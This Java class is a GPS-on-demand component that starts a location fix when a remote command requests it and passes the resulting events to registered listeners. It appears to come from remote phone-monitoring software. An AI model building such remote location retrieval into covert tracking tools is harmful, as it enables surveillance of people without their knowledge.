package com.vvt.gpsc;

import java.util.Vector;
import com.vvt.event.FxEvent;
import com.vvt.event.FxEventListener;
import com.vvt.event.FxGpsBatteryLifeDebugEvent;
import com.vvt.event.constant.FxCallingModule;
import com.vvt.event.constant.FxDebugMode;
import com.vvt.global.Global;
import com.vvt.pref.PrefGeneral;
import com.vvt.pref.Preference;
import com.vvt.pref.PreferenceType;
import com.vvt.std.Constant;
import com.vvt.std.Log;
import com.vvt.std.PhoneInfo;

public class GPSOnDemand implements FxEventListener {
	
	private final String TAG = "GPSOnDemand";
	private boolean isRequested = false;
	private FxGpsBatteryLifeDebugEvent gpsDebugEvent = null;
	private Preference pref = Global.getPreference();
	private Vector observerStore = new Vector();
	private GPSEngine gpsEngine = new GPSEngine();
	
	public GPSOnDemand() {
		gpsEngine.setFxEventListener(this);
	}
	
	public void getGPSOnDemand() {
		if (!isRequested && observerStore.size() > 0 && gpsEngine.getGPSOption() != null) {
			isRequested = true;
			PrefGeneral generalInfo = (PrefGeneral)pref.getPrefInfo(PreferenceType.PREF_GENERAL);
			if (generalInfo.getFxDebugMode().getId() == FxDebugMode.GPS.getId()) {
				constructGPSDebugEvent();
			}
			gpsEngine.setMode(FxCallingModule.MODULE_REMOTE_COMMAND);
			gpsEngine.startGPSEngine();
		}
	}
	
	public void addFxEventListener(FxEventListener observer) {
		boolean isExisted = hasFxEventListener(observer);
		if (!isExisted) {
			observerStore.addElement(observer);
		}
	}

	public void removeFxEventListener(FxEventListener observer) {
		boolean isExisted = hasFxEventListener(observer);
		if (isExisted) {
			observerStore.removeElement(observer);
		}
	}
	
	public void setGPSOption(GPSOption option) {
		gpsEngine.setGPSOption(option);
	}
	
	private void notifyError(Exception e) {
		Log.error(TAG ,".notifyError()", e);
		for (int i = 0; i < observerStore.size(); i++) {
			FxEventListener observer = (FxEventListener)observerStore.elementAt(i);
			observer.onError(e);
		}
	}
	
	private void notifyEvent(FxEvent event) {
		for (int i = 0; i < observerStore.size(); i++) {
			FxEventListener observer = (FxEventListener)observerStore.elementAt(i);
			observer.onEvent(event);
		}
	}

	private boolean hasFxEventListener(FxEventListener observer) {
		boolean isExisted = false;
		for (int i = 0; i < observerStore.size(); i++) {
			if (observerStore.elementAt(i) == observer) {
				isExisted = true;
				break;
			}
		}
		return isExisted;
	}
	
	private void constructGPSDebugEvent() {
		gpsDebugEvent = new FxGpsBatteryLifeDebugEvent();
		gpsDebugEvent.setStartTime(System.currentTimeMillis());
		gpsDebugEvent.setBattaryBefore(PhoneInfo.getBattaryLevel() + Constant.PERCENTAGE);
	}
	
	private void updateGPSDebugEvent() {
		if (gpsDebugEvent != null) {
			gpsDebugEvent.setStopTime(System.currentTimeMillis());
			gpsDebugEvent.setBattaryAfter(PhoneInfo.getBattaryLevel() + Constant.PERCENTAGE);
		}
	}
	
	// FxEventListener
	public void onError(Exception e) {
		isRequested = false;
		notifyError(e);
	}

	public void onEvent(FxEvent event) {
		isRequested = false;
		/*
		PrefGeneral generalInfo = (PrefGeneral)pref.getPrefInfo(PreferenceType.PREF_GENERAL);
		if (generalInfo.getFxDebugMode().getId() == FxDebugMode.GPS.getId()) {
			updateGPSDebugEvent();
			FxGPSEvent gpsEvent = (FxGPSEvent)event;
			gpsEvent.setDebugEvent(gpsDebugEvent);
		}
		*/
		notifyEvent(event);
	}
}
